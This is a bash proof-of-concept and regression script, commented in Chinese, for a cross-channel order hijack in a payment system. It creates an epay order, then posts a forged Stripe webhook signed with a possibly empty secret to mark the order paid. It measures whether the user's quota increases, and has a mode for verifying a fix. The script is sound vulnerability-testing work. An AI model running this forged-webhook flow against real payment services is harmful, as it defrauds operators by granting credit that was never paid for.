#!/usr/bin/env bash
# 复现跨通道订单劫持：易支付订单 + Stripe webhook 强行标记成功
#
# 环境变量：
#   BASE_URL               服务地址，如 http://localhost:3000
#   USER_COOKIE            登录 session，如 "session=MTcxMz..."
#   STRIPE_WEBHOOK_SECRET  可为空（未配置时空串签名双方必等，这就是漏洞）
#   EPAY_AMOUNT            易支付下单金额（显示单位，比如 99999）
#   EPAY_TRADE_NO          可选：跳过下单，直接指定一个已存在的 epay pending tradeNo
#   EXPECT                 attack（默认，复现攻击：delta>0 才算通过）
#                          fixed（打完补丁后验证：delta==0 才算通过）
#
# 退出码：0 = 结果与 EXPECT 一致；1 = 不一致
set -euo pipefail
cd "$(dirname "$0")"
# shellcheck source=_lib.sh
source ./_lib.sh
check_deps
: "${EPAY_AMOUNT:=99999}"
: "${EXPECT:=attack}"

echo "==> 模式: EXPECT=$EXPECT"
echo "==> STRIPE_WEBHOOK_SECRET = ${STRIPE_WEBHOOK_SECRET:-(空，空串签名)}"

echo "==> 读取测试用户当前额度"
user_id=$(get_user_id)
quota_before=$(get_quota)
echo "  user_id=$user_id  quota_before=$quota_before"

if [[ -n "${EPAY_TRADE_NO:-}" ]]; then
  trade_no="$EPAY_TRADE_NO"
  echo "==> 使用已存在的 epay tradeNo: $trade_no"
else
  echo "==> 以该用户身份创建易支付订单 (amount=$EPAY_AMOUNT)"
  trade_no=$(create_epay_order "$EPAY_AMOUNT")
  [[ -n "$trade_no" ]] || { echo "未能解析到 tradeNo" >&2; exit 2; }
  echo "  tradeNo=$trade_no"
fi

echo "==> 构造 Stripe checkout.session.completed 事件（amount_total=100，即 \$1）"
payload=$(build_stripe_event "$trade_no" 100 usd)
sig=$(stripe_sign "$STRIPE_WEBHOOK_SECRET" "$payload")

echo "==> POST /api/stripe/webhook（伪造跨通道回调）"
http_code=$(post_stripe_webhook "$payload" "$sig") || true
echo "  http_code=$http_code"

sleep 1
quota_after=$(get_quota)
delta=$(( quota_after - quota_before ))
echo "==> quota_after=$quota_after  delta=$delta"

echo
if [[ "$delta" -gt 0 ]]; then
  echo "🚨 攻击成功复现：跨通道劫持生效，用户额度凭空增加 $delta"
  status="attack"
else
  echo "🛡️  攻击未复现：用户额度未变化"
  status="fixed"
fi

if [[ "$status" == "$EXPECT" ]]; then
  echo "✅ 结果符合预期（EXPECT=$EXPECT）"
  exit 0
else
  echo "❌ 结果与预期不符（EXPECT=$EXPECT, GOT=$status）" >&2
  exit 1
fi
